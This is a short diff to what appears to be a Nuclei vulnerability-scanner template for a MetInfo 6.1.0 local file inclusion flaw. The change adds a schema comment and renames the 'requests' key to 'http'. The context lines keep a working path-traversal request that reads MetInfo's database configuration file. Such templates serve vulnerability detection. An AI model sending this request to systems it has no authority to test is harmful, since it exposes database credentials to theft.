@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: metinfo-lfi
 info:
   name: MetInfo <=6.1.0 - Local File Inclusion
@@ -11,7 +12,7 @@ info:
     cvss-score: 7.5
     cwe-id: CWE-22
   tags: metinfo,lfi
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/include/thumb.php?dir=http/.....///.....///config/config_db.php'
